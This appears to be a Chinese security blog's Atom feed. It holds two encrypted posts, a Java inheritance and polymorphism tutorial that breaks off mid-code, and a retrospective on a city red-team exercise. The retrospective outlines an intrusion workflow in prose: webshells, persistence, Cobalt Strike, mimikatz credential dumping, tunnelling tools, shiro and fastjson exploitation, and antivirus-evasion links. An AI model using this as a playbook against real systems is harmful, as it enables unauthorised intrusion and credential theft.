<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0nk3y‘s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-12-03T03:29:34.962Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Recent arrangements</title>
    <link href="https://hack-for.fun/2986.html"/>
    <id>https://hack-for.fun/2986.html</id>
    <published>2099-11-01T04:00:00.000Z</published>
    <updated>2020-12-03T03:29:34.962Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="5213892ac524e8a569545bc52ba4f61bde8c29b16a818fef6f3b2768318a2cef"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>某市HW2020心得总结</title>
    <link href="https://hack-for.fun/6988.html"/>
    <id>https://hack-for.fun/6988.html</id>
    <published>2020-12-04T16:31:53.000Z</published>
    <updated>2020-12-04T17:34:18.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote><p>首先，菜鸡道歉，DBQ另一位大师傅！我太菜了，没能拿到第一。最终拿了第三，二等奖，本地厂商第一。</p></blockquote><p>这次公鸡队比较少，7支队伍，4支本地厂商，3支大厂。大厂是<strong>奇安信、天融信、安恒。</strong></p><p>该市参演单位覆盖了媒体、学校、医院、能源、交通、银行(金融)、政府系统。但是互联网区的资产相对较少，甚至有的目标直接给的是内网靶标。</p><p>这是此次攻防的背景介绍吧。</p><h1 id="红队视角下的攻防演练"><a href="#红队视角下的攻防演练" class="headerlink" title="红队视角下的攻防演练"></a>红队视角下的攻防演练</h1><p>攻防演练之前参加过，国家级、省级都参加过，只不过是蓝队，做防守的。</p><p>蓝队的话，前期的攻击面分析、资产表整理比较麻烦。还有正式行动前的模拟对抗也是蓝队做的。等正式开始后，主要是就是安全设备的监控、策略分发、应急响应、公鸡者溯源。</p><p>红队的话，这次算第一次实地作战，之前远程支援过某直辖市的演练，体验不是很明显。</p><p>我认为，攻防中红队的目的非常明确：</p><ul><li>权限</li><li>权限</li><li>权限</li></ul><p>对，没有错，就是shell、权限（Web应用管理员、超级管理员、系统管理员权限、主机权限、数据库权限、路由器、防火墙等设备权限）。</p><p>之前，也说</p><ul><li>数据</li><li>数据</li><li>数据</li></ul><p>对，也没有错，但是要获取大量数据，主要是大量，至少也得几万几十万那种吧。不打到内网核心区，肯定是拿不到的。除非DMZ区的数据库 就很大，并且都是一些重要的数据。</p><p>并且，获取WebShell，才是开始。也就是入口权限。</p><ul><li>某系统弱口令后台修改模板GetShell-&gt;内网漫游</li><li>某系统目标同IP其他端口是Tomcat、弱口令+部署WAR包GetShell，双网卡，192段和172段、192段出网-&gt;内网漫游</li></ul><p>因为是红队，不同于常规的安服、渗透。是肯定要打内网的。所以这时候能拿下一台边界主机，存在双网卡机器的或者存在内网ip的机器权限，就可以上冰蝎，冰蝎主要是动态二进制加密，可以绕过一些安全设备的检测，当然也可以用哥斯拉。做权限维持，这里一定要拿到入口权限后做权限维持，因为一开始我们拿到一个webshell之后，被另一个公鸡队给删了。</p><p>权限维持做好后，要么弹shell到MSF上，进行横向移动，mimikataz抓密码，或者哈希。或者直接弄一个上线CS的简单免杀马，这次另一个大师傅就是在他们团队负责搞免杀的。Orz。上线CS后，也方便协同作战，并且高度自定义的CS，有很多自动化插件，一键信息搜集，当然前提是目标机器安全性很低，没有装太多杀软，要么就绕。</p><p>横向会遇到隔离问题</p><ul><li>逻辑隔离</li><li>物理隔离</li><li>强制物理隔离（有待研究是否和物理隔离有区别，记不清了）</li></ul><p>这也是第一次听这个术语，大概意思就是网络不互通，要通过跳板机流量一台一台跳。之后听奇安信的一个师傅说，有一台机器他跳了很多台，最后查看一个文件都要花一分钟。np。</p><p>说道这里，就不得不说内网穿透的问题。</p><ul><li>frp</li><li>nps</li></ul><p>流量进的去，数据出的来。</p><p>我这次在某目标翻文件的时候，删了不知道是哪个公鸡队的frp哈哈。</p><p>有的机器，拿下权限之后，不能直接托文件。只能自己下载（远程加载）：</p><ul><li>powershell</li><li>net use</li><li>……</li></ul><p>最后就说下分工吧，打红队分工真的是很重要的，如果是混战模式，即所有公鸡队的目标都是一样的，那就是比谁先发现漏洞了，谁发现的早，谁报告交的早，分就能拿到，发现的晚了，要么目标被打出局，要么洞就被修了。</p><blockquote><p>这次就是因为我们觉得某系统不好打，晚点看，等去看发现是shiro的时候，已经打不了shiro550了。因为奇安信的人打了，并且通过这个打进去了，拿了1W+分。后面目标那边把shiro升级了，我们就没办法了，在这里失分了。所以 说，还是信息搜集不到位。</p></blockquote><p>这里提到了信息搜集，就说下攻防时信息搜集的问题：</p><ul><li>很多目标没有域名</li><li>域名基本没有或者很少子域名</li><li>没有SSL证书</li><li>备案号查询甚至差不多历史域名</li><li>企查查基本没啥用</li><li>fofa都没收录这些站点</li><li>某些站点纯静态</li><li>目标系统上云</li><li>目标只是当地系统，但是托管是全国范围的</li><li>目标系统IP为供应商IP，统一管理</li></ul><p>一些方法来扩大资产：</p><ul><li>C段扫描，Goby推荐，扫的快，还能探测一些洞，估计缺点就是可能会遗漏，我还没研究为什么goby能扫的这么快。</li><li>单一IP全端口扫描</li><li>旁站（拿下旁站WebShell可以试着跳目录过去，去读、下载源码啥的，但是一般不可行</li><li>IP查历史域名</li><li>目录扫描推荐白名单目录，不要去探测一些信息泄露的目录，容易被WAF阻断</li><li>指纹识别，不要过度依赖插件或者简单凭借经验。一定要去抓包看看，看清楚了</li></ul><p>一些突破点：</p><ul><li>还是攻防神器，fastjson、shiro、Weblogic（这次没有能打的），Spring。的，一定要重点去试试，不能放过任何一个</li><li>弱口令永远的神</li><li>历史漏洞</li><li>当然有0day，我也没话说</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>心得体会就说这么多咯。暴露的我问题我内心也清楚了，要想成为RedTeam还有很长的路要走~</p><p><strong>一定要多实战！</strong></p><hr><p>推荐一些资料：github yyds</p><p><a href="https://github.com/fengjixuchui/RedTeamer">https://github.com/fengjixuchui/RedTeamer</a></p><p><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a></p><p><a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p><p><a href="https://github.com/Lucifer1993/SatanSword">https://github.com/Lucifer1993/SatanSword</a></p><p><a href="https://github.com/enaqx/awesome-pentest">https://github.com/enaqx/awesome-pentest</a></p><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;说在前面&quot;&gt;&lt;a href=&quot;#说在前面&quot; class=&quot;headerlink&quot; title=&quot;说在前面&quot;&gt;&lt;/a&gt;说在前面&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;首先，菜鸡道歉，DBQ另一位大师傅！我太菜了，没能拿到第一。最终拿了第三，二等奖，本地厂商第一。&lt;</summary>
      
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>针对几个典型问题的回答</title>
    <link href="https://hack-for.fun/995.html"/>
    <id>https://hack-for.fun/995.html</id>
    <published>2020-11-09T10:50:32.000Z</published>
    <updated>2020-12-03T03:32:01.169Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="1f7c801b1dccc4337426f0c2f22dfcc69bff4a3af8960b7eb2d3937e44bbe56a">ffec7d04fd4c92f5bf0cf7d4742b747128cd71842845ca462b867e7a80a8181ad32d935726e14e03f5923455db6354097d9f51e534685a0d1c0427e177233ea78ef44d1187590dfb515f60369c2f4c318ace3cdb5296b216ea772f73dc4ebf33655541ad6232527c31e94b055d40003f5aa55b94d16b6a1689ad5370eeaf8ec0b702486231dad15e16ae4f83147f2b581d587af89505cca1635f5fa395982a4a949c8a4bb6347a483135ab9d1b61498dc149bce9a91fcf4860aa2c1139086e2ca56ad4d60570fa96c3a7bda711eec7b2262ab166fef09887fcded875b076675ce57572b4fd519cbf3cede7a75e230774eece2add110233523dd3f1f25713a3abb0cbc51eb1c2b5b11f6d07c101ac3d8ebdefc7fd9a1d8642fc485c219389b6ba99d5f892910109d064429407215adbc2cc7bd5d7107ced1e0df99e279a3bb2dd2c4c3e81f3cfaa6c75a05df433808c864058acd7f8456eafa6b8504f3a5cbbf2dcf15b06409cace8da071fa3f9e097bc84e097a7d18a1c0e0a47a38d9c565759feb9ba5e58f07b50e2107b01de0334372f1d19d43ddf1205fff2c4a7074f36bb8fc381d91c03cbb3653b5b06ed55d704afd2b4710ff405ec9e5a4b776f39f23d374b7605607eb0214a47d9c295cf0d9105305ca3d510c3ed819269ed4323b3145acb4887ffc0d09e880917629716e637c3d7bbd4a59dac4724bc129abee48e328e2449cec9a0464f23294a23f3d301531dd2a36e12f5b33b1128efae022e35ab9b8dab6f1d19627f90320db230dff01aa0c81352b3246819885b9f69b1af18f562de10e37149079b65597850af5ebd69520ce2a953d5d92fb18884ff76138deb4c65183c66dd61c3db1844773068f19b74321c73f22dbc6abaab10e1e22b4f97431595c1ca8c574ebce1f8e08130d64faf3c625f6c89cc0c699dfb9fb0e363407a46f183636de48cc7c62118eb9e087f9a6137a53226ea48bf0ffd3b96776dc9a11ce77f1501f68279cb0b2d724a816556094e60c46d7b040051c6a75d9a73f7d4943d641572e241250e6d72278606f54fc821aca3387de5c1fc26fa1357a9e0ef63821cbcb11aefb7d2209aa6c1e63c9b991a3dded66ea6067f07f00c95b6d48478a2b60e90a08e647d0792d300fafa0c8a2310df4145f4872c5bf44d87d81cc914de7b1b6476e03e09c761b266d3bdfd7db953a0f93ab4d994541d83fb4abc79b922da52b736c9055ed18a3e6f961153af28de4a22b9267dd92fc0854f55efc754095f10c6641ac19802e9c9e8d11f692c4b677c23900dac6d59ccdf953283e14a1be8e0743586accf7f8599f490d242bf596bfdccef4aae2b0a62d228d228c81f8872ae66028d4bc1baa722b3d30ca19c2cc45895cfb67b74894e32158a8059fff075636e986d5dbb035cce009d2a0ea7c19e46d9a853c78b7cd6a27d09739a0c5e0b971e40b7004fd7a75bf6d194c8678a28b13756758da224d63c9fbd1221a4465abe940c5752faa599fbdbc77d4afc6e583f95f7d98486faaafa7946ba4c24d98be1ee2e582aa551745937b027ddf36bca5361d2760b3737f6ebbb98177a43d8b408e7950caded5c57554246aaf41bf52665bf90553c18a473258f9f7229d7f1933006ee6af4afb76c99af939e05c910b4076ea29dc9bdf2477828bec35f21f2c0865677823621ec6ef694bdb34d4c2fc7c09262aa57b30e68bdf2951ad321336be101bdab4871398655b9ef1f8b702b78430f8dbc7fd09de08c1d73ad8339f1919f876e60c55885d6dd0a910c6f0e49de4d52ce3aa1c89eabbf4e0b64cdd6b8c1063cdefc0c9cc123e58585e1d55f530e19deff04c93f79e47ba89fb3a65d070755a7987545165dba0bb0a092b70e7cd6e09cf1c03a981a2e578d78ffaac55a6a704e4fc62fb03b774686555da7869ff87b52210ab084ef5f1288f53ca556b2492a1985349da66bfefc363b2c9443ab1ac3d771708f7ee535f98afd4943089e9a39a6813c0f7ba8a538e7334f38e7823809948f2dea8b285c383a0906aa3e32d51b2d0d6252c00ef458d1ee03206e0457a45f088f0a58723b8465861ded9ae26e74f5e119882bac4177fb89828e549b1ce6a45c361844a4632810fca8dbee7e4c5c61604bbd8e37511d8a174e6c00da53471aa5cc5402f917b5cf5ff8fa9b4c4fef98f1054783f3eba6f1191248d1e62b3295cd89976de02e8a28a9718bed1b51dd7c9499609f2c5c72fa5215f6850d89579740c193b9da2624dd64ba12e934c8c9a1e8fb07618788b287ed374ab2d6e510d93f991e3a75926364d22af786c49e4958bf349e2641a74e08a60fa8719ebcb9f89ba7a42ed53f8ece370947105963897e3cdea99f662996de208a2f89769112821e156ff423962daee0f3cc54150639fa75927c7ba038a095a4482a40598caa7e04a8660421243c4665d2ebfc406f9b5175b8fd19506b8ccd391d168d879d3cf8bf20dd8f214419b8d61718092c1b2cf960248effe31407aaee5339ab71f04e7d83e31e9f6cd5b26d4cbc439d62254a8e2cf6fe18bb5ba26cc78cff4b22c29905874f84663f257aa2d1466ed9debbefa83271dbd4782850e5cac29885c99a686606ab1950e087dba0e74ecf8e876486b690174ffaa3bece37002189a3fce8bc8c9d8e0aedc841c807b38bc99a53f7b451b65411b45ac3e0e0544a682d84fd0e020bc8dd11d358c178cea5d7cd767a7e44b7eb89d65b20680271470a41ef9a745fe5486dd468449049826508b3f525cb389448d6b354df34d6c3f86bca8b5aec043bfebfba081c72990e7fe7bd2a4d55737393cbb840e33a7e65ac9ee8330a6eb8096f22860b0878ab92eaf26dfc7bec296113d15d2c7cc4f607499f081a09f5f307ec9480bff782007846880474974912d946dc1df4a529ca57f1e0d87b6cb087ccdd41ae86613b00addfde7e6efc2ee311939fc6b24103b6c307e5cbfa0e59f9862c878a901824cc43a7af41df7716e998c09d9e75612883de0d6487562a08d10c94653f4579f440499fa104bbf1f7f96cd293035020200d7f42f88206229bf5d1a890209fa5bc2c2fa02d158da8e171cce3e2d29678eaf7a9c96d96218c8b0d85a1a89bf7d8dc0549a17f1135eec6bc9baa4d7f650e68042e46ff1865841fa33866cc110745b211d7895539e3036473c7be6e5c4c34f9a87b4d3c63e85992df6d3836d2a242f18160b42276c1364bee15e56a952b73b71107ba3c1d4bfff1f5ae2c25b5f1363335ba81d391bec862291681cf4f4414c978efc3ba0388d9416b2f4f6720341f96a067cc12a34945359e25a4dc2e649ff12d184b3b10206266adbd58c3bf580d47ac975b57c9e16e08ecb8b019b018adbf8f0023c9473889b9b2632b7585f87d5413a0b4b2bdbcf2d353577f8a6b0295b51d3352b90e38f544a1a4c7cee77275d995df713858ebf5eaf900230e9dfb414fbdabd7b33a261ab8ebfda3a303c274951a940f48accf7e3d26ab1a184498a26d77a156363da58853618c32b15020991211ffb5c660a50873a3ee9e68538a1e630776556c31da887e769556960395c7cc2baccef6d02e05348f50bde6f91b0b39dc5303888171ac73bdae2ac906baf16a1adf0876a476d5bdde4cec5a90e8fb35e29d287d2c17d448c35d7b66a8c6586f4f0edc82407a4eda6b5cc5cff0ecaf09f64b89eaca86345fa8dc4170d8a783df1a07429679aec998535ec116867f5cdcb19b22ec089985a4f60f9bef061b751fedcc623d23730053689b9596b70d2c76a8c840bbfa269304d5cdb0e94b674da88742132d4d804acaa5dead5f6220ebf5a9cf026dc48a935ace083d8e20d23e79cbb5dc42ad4dbb9b46c235f7cceb8e704f0f0ad36732be43c7eb1b6e017df063d121e5b352313560a4ba9f2579117c155e70b330fd0ad4f3ef19496adf58d955a93f64b483b6457585b7ad8f07439e38b233963330c07539c62eb2c8e6b23da39eeae7361933152d2eabef38bbf57f8f34a76102e3669ee31a25bb470e9405af0115454779ac722333c58928bafe628a9924fc251bc210877b6c78653b6fcd09758a9f7e052ec81d41284c5283e5865673d6d25abaece32eb5f6fc48b3a97013c4a6ce23388b88e55f2975cc7a3f2a6a9770c44d15c2480a0b06ab9c30faa0e20fde9b956cbbc49089f3c81b39f16b5d396da564bb3c51cca688bc95ae0f7482cace05088e36c5d373978bc2b3adb33b2c5dc19115a05b5e311b8bd3e6f9f03d542e490e14ac314e8f96473e792cd4fd18ea3fcfab1744223bfa848b381f1e44c58689e093459ce3fc00c1e5314205be076b1aac2ecd85e67305fec15026ece7e6946417e5c877187d8f85b1f0f8afc85fdb7ca6279def275c7293641cd12847229edb0e03cb94512dc458b7c1ea4295a49d0afbdf9adcfad465c96edcb5e498f6d425a760fd10392f2d5aea1da7396bd02aa99c3c5eaed28218fd8c24ab8774ac8f65c1737714b2c8410239df5a28182f232fa150d3d64a8e1de1f1de7c0cf6cf61e63fdf95d5f904205cf1af30ceb3afc3bab650d2acd107b3423fb8f241b08a80f309d7e26fd0b95598844093d13c9abbaa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Coding-Java-继承与多态以及抽象类与接口</title>
    <link href="https://hack-for.fun/d300.html"/>
    <id>https://hack-for.fun/d300.html</id>
    <published>2020-11-08T09:14:55.000Z</published>
    <updated>2020-11-08T17:15:05.177Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h1><p><a href="https://www.bilibili.com/video/BV1754y1X7n9?from=search&amp;seid=6059305124304871168">https://www.bilibili.com/video/BV1754y1X7n9?from=search&amp;seid=6059305124304871168</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260454185794944">https://www.liaoxuefeng.com/wiki/1252599548343744/1260454185794944</a></p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>由于构造方法是如此特殊，所以构造方法的名称就是类名。构造方法的参数没有限制，在方法内部，也可以编写任意语句。但是，和普通方法相比，构造方法没有返回值（也没有<code>void</code>），调用构造方法，必须用<code>new</code>操作符。</p><p>没有在构造方法中初始化字段时，引用类型的字段默认是<code>null</code>，数值类型的字段用默认值，<code>int</code>类型默认值是<code>0</code>，布尔类型默认值是<code>false</code>：</p><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>在一个类中，我们可以定义多个方法。如果有一系列方法，它们的功能都是类似的，只有参数有所不同，那么，可以把这一组方法名做成<em>同名</em>方法。例如，在<code>Hello</code>类中，定义多个<code>hello()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hi, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法名相同，但各自的参数不同，称为方法重载（<code>Overload</code>）。</p><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>继承是面向对象编程中非常强大的一种机制，它首先可以复用代码。当我们让<code>Student</code>从<code>Person</code>继承时，<code>Student</code>就获得了<code>Person</code>的所有功能，我们只需要为<code>Student</code>编写新增的功能。</p><p>Java使用<code>extends</code>关键字来实现继承：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 不要重复name和age字段/方法,</span></span><br><span class="line">    <span class="comment">// 只需要定义新增score字段/方法:</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123; … &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123; … &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继承有个特点，就是子类无法访问父类的<code>private</code>字段或者<code>private</code>方法</p><p>任何<code>class</code>的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句<code>super();</code></p><blockquote><p>如果父类没有默认的构造方法，子类就必须显式调用<code>super()</code>并给出参数以便让编译器定位到父类的一个合适的构造方法。这里还顺带引出了另一个问题：即子类<em>不会继承</em>任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。</p></blockquote><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><blockquote><p>Java的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型。</p></blockquote><p>这个非常重要的特性在面向对象编程中称之为多态。它的英文拼写非常复杂：Polymorphic。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123;</span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">7500</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income... incomes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income: incomes) &#123;</span><br><span class="line">            total = total + income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>; <span class="comment">// 税率10%</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span 